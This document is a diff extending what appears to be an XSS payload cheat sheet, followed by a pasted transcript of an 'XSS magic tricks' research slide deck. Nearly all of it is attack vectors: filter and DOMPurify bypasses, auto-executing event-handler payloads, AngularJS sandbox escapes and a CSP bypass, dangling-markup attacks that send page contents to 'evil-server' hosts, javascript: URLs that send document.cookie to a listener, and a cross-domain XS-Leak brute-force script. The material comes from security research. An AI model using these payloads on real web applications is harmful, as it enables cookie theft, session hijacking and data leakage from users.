@@ -1,6 +1,31 @@
 <audio/src/onloadstart=alert``>
 <audio src onloadstart=alert``>
 <audio/src/onloadstart=alert(2)>
+<input onfocus=alert(1) id=x>
+<input onfocus=alert(1)>
+<input onblur=alert(1)>
+
+
+
+
+
+<input type="hidden"  accesskey="x" value="XSS">
+<link rel="caconical" accesskey="X" onclick="alert(1)" />
+<a href=//google.com><font size=100 color=red>CLICK ME</font></a><base target="
+<input name=x type=hidden form=x value="&lt;a href=//evil.com&gt;&lt;font size=100 color=red&gt;Click me second&lt;/font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></button><form id=x target="
+<input name=x type=hidden form=x value="&lt;a href=//evil-com&gt;&lt;font size=100 color=red&gt;Click me second&lt;/ font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></ button><form id=x target="
+
+
+alert``
+onerror=alert;throw 1
+<img src=x throw onerror=eval,"=alert\x281x29"//Uncaught = alert(1)>
+<x/><title>&lt;/title&gt;&lt;img src=1 onerror=alert(1)&gt
+
+
+
+
+
+
 <style/onload=alert()>
 <style onload=alert()>
 <img src=x onerror=alert(1)>
@@ -41,5 +66,72 @@ javascript:document.write='<iframe src=https://js13kgames.com/games/onoff/index.
 %09javascript:document.write='<img src="http://127.0.0.1:8000?cookie=' %2b document.cookie %2b '" />'
 %09javascript:document.write='<img src=x onerror=this.src='http://127.0.0.1:8000/?c='%2bdocument.cookie'" />'
 
+
+
+SSTI "Angular-JS"
+
+{{constructor.constructor('alert(1)')()}} • Can we make it shorter? • {{$eval.constructor('alert(1)')()}} • Shorter still?  {{$on.constructor('alert(1)')
+
+
+
 More:
 https://www.slideshare.net/GarethHeyes/xss-magic-tricks?fbclid=IwAR1DZL2fu-3UGTUyUJnleAP0CFhN_1TuFZCwVH0acEx8QEvABrtacVg_bCE
+
+
+1. XSS magic tricks Advancements in XSS By Gareth Heyes @garethheyes
+2. • I ❤ hacking JavaScript                • I'm a researcher at PortSwigger • Follow me on Twitter @garethheyes About me <a href=# name=x id=x>Click me on IE11</a> <script event="onclick(blah)<wtfbbq>{}" for=x> blah.view.alert(1) </script> <script event=onload for=window> return alert(2)};{ </script>
+3. Hacking filters
+4. • Consuming tags • title, noscript, style, script, noembed, textarea, plaintext, template, iframe, noframes        • Template tag breaks out of select element <noframes> <img alt=" "> </noframes> <img alt=" "> </noframes> </noframes><script>alert(1)</script> Hacking filters <template><select><option></template><img src=1 onerror=alert(1)></select></template>
+5. • Title exists in SVG and HTML • Title consumes markup in HTML but not in SVG • HTML in SVG? Hacking filters
+6. Hacking filters <svg> <image> <title> <img title="</title><script>alert(1)</script>"> </title> </svg> 🚫
+7. Hacking filters <svg> <img> <title> <img title="</title><script>alert(1)</script>"> </title> </svg> ✅
+8. • Edge bug causes title mutate • E.g.   in: <title>&lt;img&gt;  out:<title><img> • I used this bug to bypass DOMPurify • in: <x/><title>&lt;/title&gt;&lt;img src=1 onerror=alert(1)&gt;  out: <title></title><img src="1"> • What about double HTML encoded? • in: <x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;  out: <title></title><img src=1 onerror=alert(1)></title> Hacking filters
+9. • Invalid attributes  <img ="/src/onerror=alert(1)//"> • HTML closing comments Firefox (version <=67)  <!-- --!  ><img src=1 onerror=alert(1)> --> • HTML opening comments Firefox (version 68.0.1)  <!-[x00][x00][x00][x00][x00]- ><div title="--><img src=1 onerror=alert(1)>"></div> Hacking filters
+10. • Firefox allows NULLs in entities • <a href="javascript&[0x00]#x6a;avascript:alert(1)">  test</a> • <a href="javascript&[0x00]colon[0x00];alert(1)">  test</a> Hacking filters
+11. • Safari base tag • <base href="javascript:/a/-alert(1)///////"> • Turns every relative URL into XSS • <a href=../lol/safari.html>test</a> • <a href>haha</a> Hacking filters
+12. XSS without parenthesis and semi-colons
+13. • Everyone knows about alert`1` • I found you could do: onerror=alert;throw 1 • throw accepts a JavaScript expression XSS without parenthesis and semi-colons
+14. • JavaScript expressions • x = (1,2);  x//2 • Right hand side of expression is returned XSS without parenthesis and semi-colons
+15. throw onerror=alert,'some string', 123,'haha' • First part of the expression is executed sets the error handler • Last part of the expression is sent to exception handler XSS without parenthesis and semi-colons
+16. • How can you eval a string? • Prefixed with uncaught • Change it to an assignment    throw onerror=eval,"=alertx281x29"  //Uncaught = alert(1) XSS without parenthesis and semi-colons
+17. {onerror=eval}  throw{lineNumber:1, columnNumber:1,  fileName:1,  message:'alertx281x29'} • Firefox prefixes exception message with:  uncaught exception: 1 • How can we get round this? XSS without parenthesis and semi-colons
+18. Hidden inputs
+19. • XSS in hidden input • Unexploitable when <> is filtered?  <input type="hidden" value="XSS HERE"> • Access keys to the rescue! • "The accesskey global attribute provides a hint for generating a keyboard shortcut for the current element." mdn Hidden inputs
+20. • Firefox allows onclick event + access keys • <input type="hidden" accesskey="x" onclick="alert(1)">  (ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) • Firefox only but the technique can be used on Chrome Hidden inputs
+21. Link elements
+22. • Access keys can be used on Chrome • Hidden inputs don't work • Other elements link, meta etc do  <link rel="canonical" accesskey="X" onclick="alert(1)" />  (ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) Link elements
+23. Dangling markup
+24. • Uses incomplete markup to extract parts of the page • <img src='//evil-server? • HTML parser finds an incomplete src attribute • Looks for ' to close the attribute Dangling markup
+25. • Example dangling markup attacks • <table><tfoot background="//evil-server? • <link rel=icon href="//evil-server? • <video><source src="//evil? Dangling markup
+26. • Chrome protects against dangling markup attacks • "Resource requests whose URLs contained both removed whitespace (`n`, `r`, `t`) characters and less-than characters (`<`) are blocked." https://www.chromestatus.com/feature/ 5735596811091968 • CSP will also block external requests if specified in the policy Dangling markup
+27. • Bypassing restrictive CSP & Chrome mitigations • CSP: default-src 'none'; base-uri 'none'; • <base target=" • Sets target for every link • The markup will get passed in the window name Dangling markup
+28. • <a href=//evil-server><font size=100 color=red>You must click me</font></a><base target=" • Anchor points to evil server • HTML styling is used to get round no inline styles • Target consumes all markup until the " is found • Clicking the link loads attackers server which reads window.name that contains the consumed markup Dangling markup
+29. • Mitigation <base target="_self" /> • Prevents target being overwritten • Bypass requires 2 clicks • <input name=x type=hidden form=x value="&lt;a href=//evil-server&gt;&lt;font size=100 color=red&gt;Click me second&lt;/ font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></ button><form id=x target=" Dangling markup
+30. Auto executing vectors
+31. • Firefox onloadstart  <img src=1 onloadstart=alert(1)> • Firefox onloadend  <img src=1 onloadend=alert(1)> • <video><track default onload=alert(1) src="data:text/ vtt,WEBVTT"></video> Auto executing vectors
+32. • Chrome  <svg><discard onbegin=alert(1)> • Safari  <svg><anything onload=alert(1)> • General svg   <svg><animate onbegin=alert(1) attributename=x dur=1s>  <svg><set onend=alert(1) attributename=x dur=1s>  <svg><animatetransform onrepeat=alert(1) attributename=x dur=1s repeatcount=2> Auto executing vectors
+33. • <body onpageshow=alert(1)> • <body onpopstate=alert(1)>  <iframe src=//x-domain.com onload="if(!window.flag) {this.contentWindow.location='//x-domain.com/#';flag=1}"> • <body onhashchange="alert(1)">  <iframe src=//x-domain.com onload="if(!window.flag) {this.contentWindow.location='//x- domain.com#';window.flag=1;}"> • <body onmessage=alert(1)>  <script>  postMessage('test','*')  </script> Auto executing vectors
+34. • <body onbeforeunload="location='javascript:alert(1)'">  <iframe src=//x-domain.com onload="if(!window.flag) {this.contentWindow.location='//x- domain.com#';flag=1}"> • <body onresize="alert(1)">  <iframe src=//x-domain.com onload="this.style.width='1000px'"> • <body onscroll=alert(1)><div style=height:1000px></ div><div id=x></div> Auto executing vectors
+35. • <style>  @keyframes x{  }  </style>  <b style="animation-name:x" onanimationstart="alert(1)"></b>  <b style="-webkit-animation-name:x" onanimationstart="alert(1)"></b> • Discovered by the legend Mario Heiderich • Executes on every tag but requires an injected style Auto executing vectors
+36. • ontransitionend works on Chrome • <style>  :target {  color:red;  }  </style>  <x id=x style="transition:color 1s" ontransitionend=alert(1)> • URL: page.html#x Auto executing vectors
+37. • ontransitionrun works on Firefox • <style>  :target {  color:red;  }  </style>  <x id=y style="transition:color 2s" ontransitionrun=alert(1)> • URL: page.html • URL: page.html#x Auto executing vectors
+38. • Firefox ontransitioncancel • <style>  :target {  color: red;  }  </style>  <x id=x style="transition:color 10s" ontransitioncancel=alert(1)> • URL: page.html# • URL: page.html#x • URL: page.html# Auto executing vectors
+39. • Remember the classic vector?  <input autofocus onfocus=alert(1)> • Autofocus required? • Nope 😀 <input onfocus=alert(1) id=x> • URL: page.html#x Auto executing vectors
+40. • onblur becomes auto executable (Every browser except Firefox) • <input onblur=alert(1) id=x><input autofocus>  <textarea onblur=alert(1) id=x></textarea><input autofocus>  <button onblur=alert(1) id=x></button><input autofocus>  <select onblur=alert(1) id=x></select><input autofocus> • URL: page.html#x • Focus events fire for iframes too • <body onblur=alert(1)><iframe id=x></iframe>  <iframe id=x onblur=alert(1)></iframe><input autofocus> Auto executing vectors
+41. • <embed id=x onfocus=alert(1) type=text/html> • <object id=x onfocus=alert(1) type=text/html> • <video id=x controls onfocus=alert(1)>  <source src="validvideo.mp4" type=video/mp4>  </video> • <audio id=x controls onfocus=alert(1) id=x>  <source src="validaudio.wav">  </audio> Auto executing vectors
+42. AngularJS
+43. • Standard AngularJS sandbox escape:  {{constructor.constructor('alert(1)')()}} • Can we make it shorter? • {{$eval.constructor('alert(1)')()}} • Shorter still?  {{$on.constructor('alert(1)')()}}  //Credits Lewis Ardern AngularJS
+44. • What if you can't call $eval? e.g. in a orderBy filter • Can't use strings • {{toString().constructor.prototype.charAt=[].join; [1,2]| orderBy:toString().constructor.fromCharCode(120,61,9 7,108,101,114,116,40,49,41)}} AngularJS
+45. • CSP bypass for all versions of AngularJS • 63 characters! • <input id=x ng-focus=$event.path| orderBy:'CSS&&[1].map(alert)'> • page.html#x • Cross browser:  <input id=x ng-focus=$event.composedPath()| orderBy:'CSS&&[1].map(alert)'> AngularJS
+46. XS-Leak
+47. • Focus event fires for iframe, input etc • Can we detect if this happens cross domain? • If it can be detected then id's can be bruteforced x-domain XS-Leak
+48. • onblur event will be fired when cross domain element is focused • Hash can be checked multiple times with only 1 http request • Requires a frame-able page XS-Leak
+49. XS-Leak Cross domain input element Same origin onblur event Same origin, shows current position <input id=1337> <body onblur="if(!window.found){window.found=true;alert('Found: '+pos)}"> <div id=y></div>
+50. pos = 1000;found = false; var iframe = document.createElement('iframe');iframe.src='//x-domain.com'; document.body.appendChild(iframe);iframe.onload = next; function next() { if(!found){ document.getElementById('y').textContent = pos; iframe.src='//x-domain.com#'+pos; timer = setTimeout(function(){ if(!found && pos < 2000) { pos++; } next(); },50); } } //http://portswigger-labs.net/x-domain_leak_focus_095FD68DF/ XS-Leak
+51. Auto execute on every tag?
+52. • "The tabindex global attribute indicates if its element can be focused, and if/where it participates in sequential keyboard navigation" mdn • <a onfocus=alert(1) id=x tabindex=1> • <div onfocus=alert(1) id=x tabindex=1> • <xss onfocus=alert(1) id=x tabindex=1> • page.html#x Auto execute on every tag?
+53. • Works on pretty much every tag • Link works but requires display block • <link onfocus=alert(1) id=x tabindex=1 style=display:block> • Link works in the body but not head Auto execute on every tag?
+54. • <a onfocusin=alert(1) id=x tabindex=1> • <div onfocusin=alert(1) id=x tabindex=1> • <xss onfocusin=alert(1) id=x tabindex=1> • <xss onfocusout=alert(1) id=x tabindex=1><input autofocus> • page.html#x Auto execute on every tag?
+55. • IE activate/beforeactivate event • <a onactivate=alert(1) id=x tabindex=1> • <div onactivate=alert(1) id=x tabindex=1> • <xss onactivate=alert(1) id=x tabindex=1> • <xss onbeforeactivate=alert(1) id=x tabindex=1> • page.html#x Auto execute on every tag?
+56. • IE deactivate/beforedeactivate event • <a ondeactivate=alert(1) id=x tabindex=1></ a><input id=y autofocus> • <xss ondeactivate=alert(1) id=x tabindex=1></ xss><input id=y autofocus> • <xss onbeforedeactivate=alert(1) id=x tabindex=1></ a><input id=y autofocus> • page.html#x • page.html#y Auto execute on every tag?
+57. Questions? thanks and shout outs to @garethheyes James Kettle, Mario Heiderich, Eduardo Vela, Masato Kinugawa, Filedescriptor, LeverOne, Ben Hayak, Alex Inführ, Mathias Karlsson, Jan Horn, Ian Hickey, Gábor Molnár, tsetnep, Psych0tr1a, Skyphire, Abdulrhman Alqabandi, brainpillow, Kyo, Yosuke Hasegawa, White Jordan, Algol, jackmasa, wpulog, Bolk, Robert Hansen, David Lindsay, Superhei, Michal Zalewski, Renaud Lifchitz, Roman Ivanov, Frederik Braun, Krzysztof Kotowicz, Giorgio Maone, GreyMagic, Marcus Niemietz, Soroush Dalili, Stefano Di Paola, Roman Shafigullin, Lewis Ardern, Michał Bentkowski <img src=1 onerror="alert('Wait. What. IE/Edge')};while(true)sendMeToTheJSBlackHole();function lol(){">
